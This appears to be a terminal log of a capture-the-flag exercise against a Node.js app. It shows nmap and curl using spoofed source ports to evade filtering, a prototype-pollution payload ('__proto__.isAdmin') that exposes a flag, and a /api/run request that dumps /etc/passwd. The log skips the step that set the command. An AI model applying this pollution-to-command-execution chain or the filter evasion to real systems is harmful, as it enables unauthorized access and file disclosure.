axmi222 …/Documentos/Hacking/hackGDL   11:10  
❯ sudo nmap -sV -sC -Pn -g 53 -p 1337 10.0.1.6
[sudo] contraseña para axmi222: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 11:10 -0600
Nmap scan report for 10.0.1.6 (10.0.1.6)
Host is up.

PORT     STATE    SERVICE VERSION
1337/tcp filtered waste

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.79 seconds
                                                                                                                    

axmi222 …/Documentos/Hacking/hackGDL   11:10  
❯ sudo curl --local-port 53 http://10.0.1.6:1337
// app.js
const express = require("express");
const bodyParser = require("body-parser");
const goog = require("google-protobuf");
const { exec } = require("child_process");
const fs = require("fs");
const path = require("path");
const { FLAG } = require("./flag");

const app = express();
app.use(bodyParser.json());

app.get("/", (_req, res) => {
  res.type("text/plain").send(
    fs.readFileSync(path.join(__dirname, "app.js"), "utf8")
  );
});

app.post("/api/config", (req, res) => {
  try {
    goog.exportSymbol(req.body.path, req.body.value);
  } catch { }

  res.json({ ok: true });
});

// flag endpoint
app.get("/api/flag", (_req, res) => {
  if (({}).isAdmin === true) res.send(FLAG);
  else res.status(403).send("NO FLAG");
});


app.get("/api/run", (_req, res) => {
  const o = {};
  if (o.cmd) exec(o.cmd, (_, out) => res.send(out));
  else res.status(400).send("NO CMD");
});

app.listen(1337);


axmi222 …/Documentos/Hacking/hackGDL   11:12  
❯ sudo curl --local-port 53 -X POST -H "Content-Type: application/json" \
-d '{"path": "__proto__.isAdmin", "value": true}' \
http://10.0.1.6:1337/api/config
{"ok":true}        


axmi222 …/Documentos/Hacking/hackGDL   11:14     
❯ sudo curl --local-port 88 http://10.0.1.6:1337/api/flag  
ETSCTF_90a801f907c4f2967628770d04dea36a


axmi222 …/Documentos/Hacking/hackGDL   11:18     
❯ sudo curl --local-port 67 http://10.0.1.6:1337/api/run  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin  
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin  
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin  
polkitd:x:997:997:polkit:/nonexistent:/usr/sbin/nologin  
ETSCTF:x:1000:1000:ETSCTF_fa9c7c690acdb3cf3d73bf1c7f326a82:/home/ETSCTF:/bin/bash